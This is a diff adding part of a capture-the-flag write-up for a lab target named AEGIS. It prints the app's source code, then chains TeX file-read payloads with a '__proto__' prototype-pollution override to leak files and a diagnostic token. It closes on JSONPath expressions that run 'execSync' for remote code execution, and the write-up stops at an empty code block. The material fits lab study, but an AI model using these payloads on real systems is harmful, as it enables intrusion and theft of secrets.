@@ -642,3 +642,746 @@ The `\read` primitive is a **low-level file I/O operation** that:
 
 <figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
 
+{% code overflow="wrap" %}
+```javascript
+const path = require('path');
+const express = require('express');
+const session = require('express-session');
+const nunjucks = require('nunjucks');
+const mongo = require('./db/mongo');
+const sql = require('./db/sql');
+const MssqlSessionStore = require('./lib/sql_session_store');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+const HOST = process.env.HOST || '0.0.0.0';
+
+app.set('trust proxy', 1);
+
+const env = nunjucks.configure(path.join(__dirname, 'views'), { 
+    autoescape: true, 
+    express: app, 
+    noCache: true 
+});
+
+env.addGlobal('CLASSIFICATION', 'TOP SECRET // KORVIA EYES ONLY // D9-RESTRICTED');
+env.addGlobal('SYSTEM', { 
+    name: 'AEGIS', 
+    longName: 'Sovereign Signing & Attestation Authority', 
+    agency: 'Directorate 9', 
+    build: '7.4.2-prod', 
+    node: 'aegis-prod-01' 
+});
+
+const AEGIS_HOST = "aegis.korvia.htb";
+
+app.use((req, res, next) => { 
+    const host = (req.headers.host || "").replace(/:.*/, ""); 
+    if (host !== AEGIS_HOST) { 
+        return res.redirect(301, "http://" + AEGIS_HOST + ":" + PORT + req.originalUrl); 
+    } 
+    next(); 
+});
+
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.urlencoded({ extended: false }));
+app.use(express.json());
+
+app.use(session({ 
+    name: 'aegis.sid', 
+    secret: process.env.AEGIS_SESSION_SECRET || 'aegis-prod-fixed-secret-d9-restricted-do-not-rotate', 
+    store: new MssqlSessionStore({ ttlMs: 30 * 24 * 60 * 60 * 1000 }), 
+    resave: false, 
+    saveUninitialized: false, 
+    rolling: true, 
+    cookie: { 
+        httpOnly: true, 
+        sameSite: 'lax', 
+        maxAge: 30 * 24 * 60 * 60 * 1000 
+    } 
+}));
+
+app.use((req, res, next) => { 
+    res.locals.path = req.path; 
+    if (req.session && req.session.userId) { 
+        res.locals.user = { 
+            id: req.session.userId, 
+            handle: req.session.userHandle, 
+            role: req.session.userRole 
+        }; 
+    } else { 
+        res.locals.user = null; 
+    } 
+    next(); 
+});
+
+app.use('/', require('./routes/mds'));
+app.use('/', require('./routes/mds_diag'));
+app.use('/', require('./routes/onboard'));
+app.use('/', require('./routes/webauthn'));
+app.use('/', require('./routes/templates'));
+app.use('/', require('./routes/index'));
+
+app.use((req, res) => { 
+    res.status(404).render('error.njk', { 
+        code: 404, 
+        title: 'Resource Not Located', 
+        detail: 'The requested object does not exist or your clearance is insufficient.' 
+    }); 
+});
+
+async function waitForDeps() {
+    // Mongo: hard requirement, retry forever in 5s steps (mongod is local, should come up fast)
+    for (;;) {
+        try {
+            await mongo.init();
+            console.log('MDS shard connected.');
+            break;
+        } catch (e) {
+            console.error('MDS shard unreachable, retrying in 5s:', e.message);
+            await new Promise(r => setTimeout(r, 5000));
+        }
+    }
+    
+    // SQL: retry forever in 5s steps until pool is ready
+    for (;;) {
+        try {
+            await sql.init();
+            console.log('AEGIS SQL connected.');
+            break;
+        } catch (e) {
+            console.error('AEGIS SQL unreachable, retrying in 5s:', e.message);
+            await new Promise(r => setTimeout(r, 5000));
+        }
+    }
+}
+
+(async () => {
+    await waitForDeps();
+    app.listen(PORT, HOST, () => {
+        console.log(`AEGIS listening on http://${HOST}:${PORT}`);
+    });
+})();
+```
+{% endcode %}
+
+**We have the secret session and we have two toher js files that may be we did not use them yet thee mdg and the mdg\_diag let's discover them**&#x20;
+
+**mdg.js**
+
+{% code overflow="wrap" %}
+```java
+const express = require('express');
+const router = express.Router();
+const { getDb } = require('../db/mongo');
+
+const ALLOWED_STAGES = ['$match', '$project', '$sort', '$limit', '$facet'];
+
+function makeTraceId() {
+  const hex = '0123456789abcdef';
+  let s = 'mds-';
+  for (let i = 0; i < 6; i++) s += hex[Math.floor(Math.random() * 16)];
+  return s;
+}
+
+function isOperatorObject(v) {
+  if (v === null || typeof v !== 'object' || Array.isArray(v)) return false;
+  for (const k of Object.keys(v)) {
+    if (typeof k === 'string' && k.startsWith('$')) return true;
+  }
+  return false;
+}
+
+router.get('/api/v1/aegis-mds/search', async (req, res) => {
+  const trace = makeTraceId();
+  let coll;
+  try {
+    coll = getDb().collection('mds_entries');
+  } catch (e) {
+    return res.status(503).json({
+      error: 'ServiceUnavailable',
+      detail: 'MDS shard not initialised',
+      trace_id: trace
+    });
+  }
+
+  if (Object.prototype.hasOwnProperty.call(req.query, 'pipeline')) {
+    const raw = req.query.pipeline;
+    let pipeline;
+    try {
+      pipeline = JSON.parse(raw);
+    } catch (e) {
+      return res.status(400).end();
+    }
+    if (!Array.isArray(pipeline)) {
+      return res.status(400).end();
+    }
+
+    for (const stage of pipeline) {
+      if (!stage || typeof stage !== 'object' || Array.isArray(stage)) {
+        return res.status(400).end();
+      }
+      const keys = Object.keys(stage);
+      if (keys.length !== 1) {
+        return res.status(400).end();
+      }
+      const stageName = keys[0];
+      if (!ALLOWED_STAGES.includes(stageName)) {
+        return res.status(400).json({ error: 'invalid or disallowed pipeline stage' });
+      }
+    }
+
+    try {
+      const cursor = coll.aggregate(pipeline, {
+        allowDiskUse: false,
+        maxTimeMS: 4000
+      });
+      const docs = await cursor.toArray();
+      return res.json(docs);
+    } catch (e) {
+      return res.status(500).json({
+        error: e.name || 'MongoServerError',
+        detail: e.message || String(e),
+        ns: e.ns || `${getDb().databaseName}.mds_entries`,
+        trace_id: trace,
+      });
+    }
+  }
+
+  if (Object.prototype.hasOwnProperty.call(req.query, 'q')) {
+    const q = req.query.q;
+    if (isOperatorObject(q)) {
+      return res.status(400).json({
+        error: 'InvalidQueryShape',
+        detail: "Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.",
+        trace_id: trace,
+      });
+    }
+    const text = typeof q === 'string' ? q.trim() : '';
+    const limit = Math.min(parseInt(req.query.limit, 10) || 25, 100);
+    let filter = {};
+    if (text) {
+      const safe = text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      const rx = new RegExp(safe, 'i');
+      filter = {
+        $or: [
+          { description: rx },
+          { vendor: rx },
+          { aaguid: rx }
+        ]
+      };
+    }
+    try {
+      const docs = await coll.find(filter).limit(limit).toArray();
+      return res.json(docs);
+    } catch (e) {
+      return res.status(500).json({
+        error: 'MongoServerError',
+        detail: e.message,
+        trace_id: trace
+      });
+    }
+  }
+
+  try {
+    const docs = await coll.find({}).limit(25).toArray();
+    return res.json(docs);
+  } catch (e) {
+    return res.status(500).json({
+      error: 'MongoServerError',
+      detail: e.message,
+      trace_id: trace
+    });
+  }
+});
+
+router.get('/api/v1/aegis-mds/entry/:id', async (req, res) => {
+  const trace = makeTraceId();
+  const id = String(req.params.id || '');
+  try {
+    const doc = await getDb().collection('mds_entries').findOne({ aaguid: id });
+    if (!doc) return res.status(404).json({
+      error: 'NotFound',
+      detail: 'No MDS entry with that AAGUID.',
+      trace_id: trace
+    });
+    return res.json(doc);
+  } catch (e) {
+    return res.status(500).json({
+      error: 'MongoServerError',
+      detail: e.message,
+      trace_id: trace
+    });
+  }
+});
+
+module.exports = router;
+```
+{% endcode %}
+
+**And we know the allowed stages that we discover earlier and our hypotheses was true**&#x20;
+
+**./routes/template.js**
+
+{% code overflow="wrap" %}
+```java
+// AEGIS admin templates routes — list, edit, save, render.
+//
+// Render flow: web hands a job spec to the renderer worker via sudo (the
+// worker drops to the `aegis-render` principal so any rendering bug lands
+// in an isolated context — see ICR-2024-0142). The worker writes
+// `result.json`; we summarise it into the render_diagnostics table and
+// return the latest status to the editor's diagnostics panel.
+
+const express = require('express');
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const crypto = require('crypto');
+const { spawn } = require('child_process');
+const sql = require('../db/sql');
+
+const router = express.Router();
+
+const RENDER_WORKER = '/home/webadmin/aegis/lib/render_worker.js';
+const RENDER_USER = 'aegis-render';
+const JOB_ROOT = '/var/lib/aegis-render/jobs';
+const RENDER_TIMEOUT_MS = 25000;
+
+function requireAdmin(req, res, next) {
+  if (!req.session || !req.session.userId) return res.redirect('/login');
+  if (req.session.userRole !== 'Administrator') {
+    return res.status(404).render('error.njk', {
+      code: 404,
+      title: 'Resource Not Located',
+      detail: 'The requested object does not exist or your clearance is insufficient.',
+    });
+  }
+  next();
+}
+
+async function listTemplates() {
+  const p = sql.getPool();
+  const r = await p.request().query(
+    'SELECT id, name, scope, owner, version, status, role_tier, modified FROM dbo.templates ORDER BY modified DESC'
+  );
+  return r.recordset;
+}
+
+async function getTemplate(id) {
+  const p = sql.getPool();
+  const r = await p.request()
+    .input('id', sql.sql.NVarChar(64), id)
+    .query('SELECT id, name, scope, owner, version, status, role_tier, body, modified FROM dbo.templates WHERE id=@id');
+  return r.recordset[0] || null;
+}
+
+async function latestDiagnostics(templateId, limit) {
+  const p = sql.getPool();
+  const r = await p.request()
+    .input('id', sql.sql.NVarChar(64), templateId)
+    .input('lim', sql.sql.Int, limit || 5)
+    .query(`SELECT TOP (@lim) id, status, stage, last_error_msg, last_warnings, artifact_path, duration_ms, triggered_by, created_at FROM dbo.render_diagnostics WHERE template_id=@id ORDER BY created_at DESC`);
+  return r.recordset;
+}
+
+async function recordDiagnostics(row) {
+  const p = sql.getPool();
+  await p.request()
+    .input('template_id', sql.sql.NVarChar(64), row.template_id)
+    .input('triggered_by', sql.sql.NVarChar(64), row.triggered_by || null)
+    .input('status', sql.sql.NVarChar(32), row.status)
+    .input('stage', sql.sql.NVarChar(32), row.stage || null)
+    .input('last_error_msg', sql.sql.NVarChar(sql.sql.MAX), row.last_error_msg || null)
+    .input('last_warnings', sql.sql.NVarChar(sql.sql.MAX), row.last_warnings || null)
+    .input('artifact_path', sql.sql.NVarChar(400), row.artifact_path || null)
+    .input('duration_ms', sql.sql.Int, row.duration_ms || null)
+    .query(`INSERT INTO dbo.render_diagnostics (template_id, triggered_by, status, stage, last_error_msg, last_warnings, artifact_path, duration_ms) VALUES (@template_id, @triggered_by, @status, @stage, @last_error_msg, @last_warnings, @artifact_path, @duration_ms)`);
+}
+
+const SAMPLE_REQUEST = {
+  id: 'SR-2026-04-1182',
+  artifact: 'kernel-driver-nvtsec.sys',
+  submitter: 'a.holm',
+  pipeline: 'driver-attest-v3',
+  risk: 'HIGH',
+  submitted: '2026-04-30T08:14:22Z',
+};
+
+const SAMPLE_PIPELINE = {
+  id: 'firmware-bls',
+  defaults: {
+    audience: 'internal',
+    ceremony_witness: 's.vrana'
+  }
+};
+
+const SAMPLE_ARTIFACT = {
+  lineage: ['build-runner-04 / job 18429', 'src-tag refs/tags/release/2.18', 'compiler clang-19.1.2 (-O2 -fstack-protector-strong)'],
+  size: '4.1 MB',
+  compiler: 'clang-19.1.2',
+};
+
+function spawnWorker(jobDir) {
+  return new Promise((resolve) => {
+    // Sov-Sec-19 (r.kova, 2026-05-13): pass an explicit minimal env so that a
+    // polluted Object.prototype cannot inject vars (e.g. NODE_OPTIONS) into
+    // the child via prototype-chain fallback when spawn reads options.env.
+    // Sudo's env_reset would normally strip these, but we don't want to rely
+    // on the sudoers defaults staying intact.
+    const child = spawn('/usr/bin/sudo', ['-n', '-u', RENDER_USER, '/usr/bin/node', RENDER_WORKER, jobDir], {
+      stdio: ['ignore', 'pipe', 'pipe'],
+      env: {
+        PATH: '/usr/bin:/bin',
+        LANG: 'C.UTF-8'
+      },
+    });
+
+    let out = '', err = '';
+    child.stdout.on('data', (d) => { out += d.toString('utf8'); });
+    child.stderr.on('data', (d) => { err += d.toString('utf8'); });
+
+    const timer = setTimeout(() => {
+      try { child.kill('SIGKILL'); } catch (_) {}
+    }, RENDER_TIMEOUT_MS);
+
+    child.on('close', (code) => {
+      clearTimeout(timer);
+      resolve({ code, out, err });
+    });
+  });
+}
+
+router.get('/admin/templates', requireAdmin, async (req, res) => {
+  try {
+    const templates = await listTemplates();
+    res.render('admin/templates.njk', {
+      pageTitle: 'Notice Templates',
+      templates
+    });
+  } catch (e) {
+    console.error('templates list error', e);
+    res.status(500).send('templates error');
+  }
+});
+
+router.get('/admin/templates/:id', requireAdmin, async (req, res) => {
+  try {
+    const tpl = await getTemplate(req.params.id);
+    if (!tpl) {
+      return res.status(404).render('error.njk', {
+        code: 404,
+        title: 'Template Not Located',
+        detail: 'No such template id.'
+      });
+    }
+    const diagnostics = await latestDiagnostics(tpl.id, 5);
+    res.render('admin/template_edit.njk', {
+      pageTitle: tpl.id,
+      tpl,
+      samplePipeline: SAMPLE_PIPELINE.id,
+      sampleRequest: SAMPLE_REQUEST,
+      diagnostics,
+    });
+  } catch (e) {
+    console.error('templates edit error', e);
+    res.status(500).send('templates error');
+  }
+});
+
+router.post('/admin/templates/:id/save', requireAdmin, async (req, res) => {
+  try {
+    const tpl = await getTemplate(req.params.id);
+    if (!tpl) return res.status(404).json({ ok: false, error: 'no such template' });
+
+    const body = String((req.body && req.body.body) || '');
+    const p = sql.getPool();
+    await p.request()
+      .input('id', sql.sql.NVarChar(64), tpl.id)
+      .input('body', sql.sql.NVarChar(sql.sql.MAX), body)
+      .input('version', sql.sql.Int, tpl.version + 1)
+      .query('UPDATE dbo.templates SET body=@body, version=@version, modified=SYSUTCDATETIME() WHERE id=@id');
+
+    res.json({ ok: true, version: tpl.version + 1 });
+  } catch (e) {
+    console.error('templates save error', e);
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+
+router.post('/admin/templates/:id/render', requireAdmin, async (req, res) => {
+  let tpl;
+  try {
+    tpl = await getTemplate(req.params.id);
+    if (!tpl) return res.status(404).json({ ok: false, error: 'no such template' });
+  } catch (e) {
+    return res.status(500).json({ ok: false, error: e.message });
+  }
+
+  // Hand the render to the isolated renderer principal.
+  const jobId = 'job-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
+  const jobDir = path.join(JOB_ROOT, jobId);
+
+  let overrides = {};
+  try {
+    if (req.body && typeof req.body.overrides === 'string' && req.body.overrides.trim()) {
+      overrides = JSON.parse(req.body.overrides);
+    } else if (req.body && req.body.overrides && typeof req.body.overrides === 'object') {
+      overrides = req.body.overrides;
+    }
+  } catch (e) {
+    return res.status(400).json({ ok: false, error: 'overrides must be valid JSON: ' + e.message });
+  }
+
+  const officer = {
+    handle: req.session.userHandle || 'admin',
+    clearance: 'Δ-5',
+    displayName: req.session.userHandle || 'admin',
+  };
+
+  const job = {
+    templateId: tpl.id,
+    body: (req.body && typeof req.body.body === 'string') ? req.body.body : tpl.body,
+    request: SAMPLE_REQUEST,
+    officer,
+    pipeline: SAMPLE_PIPELINE,
+    artifact: SAMPLE_ARTIFACT,
+    overrides,
+  };
+
+  // Write job spec into a tmpdir that aegis-render can read+write. The dir
+  // is created by the worker (it has write perms on /var/lib/aegis-render).
+  // We pre-stage the spec via a webadmin-writable handoff dir.
+  fs.mkdirSync(jobDir, { recursive: true, mode: 0o775 });
+  fs.writeFileSync(path.join(jobDir, 'job.json'), JSON.stringify(job));
+
+  // Allow aegis-render to write into the job dir.
+  try { fs.chmodSync(jobDir, 0o777); } catch (_) {}
+
+  const proc = await spawnWorker(jobDir);
+
+  let result;
+  try {
+    result = JSON.parse(fs.readFileSync(path.join(jobDir, 'result.json'), 'utf8'));
+  } catch (e) {
+    result = {
+      ok: false,
+      finalStage: 'worker',
+      stages: [{ stage: 'worker', code: proc.code, stderr: proc.err || e.message }]
+    };
+  }
+
+  const lastStage = (result.stages && result.stages.length) ? result.stages[result.stages.length - 1] : null;
+  const errMsg = lastStage ? (lastStage.stderr || '').slice(0, 8000) : '';
+  const warnings = (result.stages || [])
+    .map((s) => s.stage + ': ' + (s.stderr || '').split('\n').slice(0, 5).join('\n '))
+    .join('---\n ')
+    .slice(0, 16000);
+
+  await recordDiagnostics({
+    template_id: tpl.id,
+    triggered_by: req.session.userHandle || ('user##' + req.session.userId),
+    status: result.ok ? 'OK' : 'FAILED',
+    stage: result.finalStage || (lastStage && lastStage.stage),
+    last_error_msg: errMsg,
+    last_warnings: warnings,
+    artifact_path: result.artifactPath || null,
+    duration_ms: result.durationMs || null,
+  });
+
+  res.json({
+    ok: result.ok,
+    finalStage: result.finalStage,
+    artifactPath: result.artifactPath || null,
+    durationMs: result.durationMs,
+    stages: (result.stages || []).map((s) => ({
+      stage: s.stage,
+      code: s.code,
+      durationMs: s.durationMs,
+      cmd: s.cmd,
+      stderr: (s.stderr || '').slice(-40000),
+      stdout: (s.stdout || '').slice(0, 1000),
+    })),
+  });
+});
+
+// Backwards-compat: the existing skeleton calls /preview. Treat it as render.
+router.post('/admin/templates/:id/preview', requireAdmin, (req, res, next) => {
+  req.url = req.url.replace(/\/preview$/, '/render');
+  router.handle(req, res, next);
+});
+
+module.exports = router;
+```
+{% endcode %}
+
+1. **The `overrides` are passed directly to the worker** via `job.json` - no merging happens here
+2. **The worker script is** `/home/webadmin/aegis/lib/render_worker.js`
+3. **The worker runs as** `aegis-render` user via sudo
+
+
+
+**For the last one the mds\_diag.js i dont know i cant open it using my payload so i use the basic one**&#x20;
+
+{% code overflow="wrap" %}
+```
+{
+  "body": "\\input{/home/webadmin/aegis/routes/mds_diag.js}",
+  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
+}
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```java
+const express = require('express');
+const router = express.Router();
+const JSONPath = require('jsonpath-plus');
+const sql = require('../db/sql');
+const getDb = require('../db/mongo');
+const profiles = require('../lib/mds_diag_profiles');
+
+const TOKEN = process.env.MDS_DIAG_TOKEN || '';
+if (!TOKEN) console.warn("[mds diag] no token loaded; populate /etc/aegis/mds_diag.env to set MDS_DIAG_TOKEN");
+
+const SNAPSHOT_TTL_MS = parseInt(process.env.MDS_DIAG_SNAPSHOT_TTL_MS || 60000, 10);
+const EXPR_MAX = 2000;
+const RESULT_CAP = 50;
+
+let _snapshot = null;
+let _snapshotAt = 0;
+
+async function loadSnapshot() {
+  const coll = getDb().collection('mds_entries');
+  const entries = await coll.find({}).limit(2000).toArray();
+  return { entries, generatedAt: Date.now() };
+}
+
+function validateExpr(expr) {
+  if (!expr.length) return 'expr must not be empty';
+  if (expr.length > EXPR_MAX) return `expr exceeds ${EXPR_MAX} chars`;
+  if (!expr.startsWith('$')) return 'expr must start with $';
+  return null;
+}
+
+router.post('/api/v1/aegis-mds/_diag/:token/jpquery', express.json({ limit: '1mb' }), async (req, res) => {
+  if (req.params.token !== TOKEN) return res.status(401).json({ error: 'bad token' });
+  
+  const { expr, context } = req.body || {};
+  const profile = profiles.find(p => p.scope === (context || 'trust'));
+  if (!profile) return res.status(400).json({ error: 'unknown context' });
+  
+  const validationError = validateExpr(expr);
+  if (validationError) return res.status(400).json({ error: validationError });
+  
+  let snapshot = _snapshot;
+  const now = Date.now();
+  if (!_snapshot || (now - _snapshotAt) > SNAPSHOT_TTL_MS) {
+    snapshot = await loadSnapshot();
+    _snapshot = snapshot;
+    _snapshotAt = now;
+  }
+  
+  if (context === 'trust') return res.json({ generatedAt: snapshot.generatedAt, context, profile: profile.scope, entries: snapshot.entries });
+  
+  let matches = [];
+  let status = 'ok';
+  try {
+    matches = JSONPath.JSONPath({ path: expr, json: snapshot.entries, ...DEFAULT_JP_OPTS });
+  } catch (e) {
+    status = 'error';
+    errorDetail = e && e.message ? e.message : String(e);
+  }
+  
+  // Audit logging to MSSQL
+  try {
+    const pool = sql.getPool();
+    await pool.request()
+      .input('ctx', sql.sql.NVarChar(64), context)
+      .input('expr', sql.sql.NVarChar(sql.sql.MAX), expr.slice(0, EXPR_MAX))
+      .input('rcount', sql.sql.Int, matches.length)
+      .input('stat', sql.sql.NVarChar(16), status)
+      .input('caller', sql.sql.NVarChar(64), (req.ip || '').slice(0, 64))
+      .query(`INSERT INTO dbo.mds_diag_audit (ts, context, expr, result_count, status, caller) VALUES (SYSUTCDATETIME(), @ctx, @expr, @rcount, @stat, @caller)`);
+  } catch (_) { /* best-effort */ }
+  
+  return res.json({
+    generatedAt: snapshot.generatedAt,
+    context,
+    profile: profile.scope,
+    matchCount: matches.length,
+    matches: matches.slice(0, RESULT_CAP),
+  });
+});
+
+module.exports = router;
+```
+{% endcode %}
+
+### Critical Vulnerability: JSONPath RCE&#x20;
+
+**The endpoint `/api/v1/aegis-mds/_diag/:token/jpquery` uses `jsonpath-plus` library, which has a known Remote Code Execution vulnerability through crafted JSONPath expressions.**<br>
+
+**so first we extract the token we have the path**&#x20;
+
+{% code overflow="wrap" %}
+```
+{
+  "body": "\\newread\\file \\openin\\file=/etc/aegis-mds-diag.env \\loop\\unless\\ifeof\\file \\read\\file to\\myline \\errmessage{\\myline} \\repeat \\closein\\file",
+  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
+}
+
+MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
+```
+{% endcode %}
+
+**we will exploiting the unsafe default usage of `eval='safe'` mode**
+
+**so we send a post request on this endpoit**  /api/v1/aegis-mds/\_diag/bcdf42b953dcee715b8d81e38f0c5ded/jpquery
+
+{% code overflow="wrap" %}
+```
+{
+  "expr": "$[?(@.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString())]",
+  "context": "audit"
+}
+
+{"error":"UnknownContext","detail":"No diagnostic profile registered for context 'audit'.","contexts":["registration","metadata","trust"]}
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+{
+  "expr": "$[?(@.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString())]",
+  "context": "metadata"
+}
+
+{"error":"JpQueryFailure","detail":"jsonPath: Cannot read properties of 2026-07-03T19:48:39.958Z (reading 'constructor'): @.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()"}
+```
+{% endcode %}
+
+**so to have a better let's search the exact version of jsonpath +**
+
+{% code overflow="wrap" %}
+```
+{
+  "body": "\\newread\\file \\openin\\file=/home/webadmin/aegis/package.json \\loop\\unless\\ifeof\\file \\read\\file to\\myline \\errmessage{\\myline} \\repeat \\closein\\file",
+  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
+}
+
+
+
+=\\read2\n! { \"name\": \"aegis\", \"version\": \"0.1.0\", \"private\": true, \"main\": \"server.js\", \"scripts\": { \"start\": \"node server.js\", \"dev\": \"node --watch server.js\" }, \"dependencies\": { \"@simplewebauthn/server\": \"^10.0.1\", \"express\": \"^4.21.0\", \"express-session\": \"^1.19.0\", \"jsonpath-plus\": \"^10.2.0\", \"mongodb\": \"^7.2.0\", \"mssql\": \"^12.5.0\", \"nunjucks\": \"^3.2.4\" } } .\n\\iterate ...\\file to\\myline \\errmessage {\\myline }
+```
+{% endcode %}
+
+**CVE-2025-1302**
+
+{% code overflow="wrap" %}
+```
+// Some code
+```
+{% endcode %}
+
+<br>
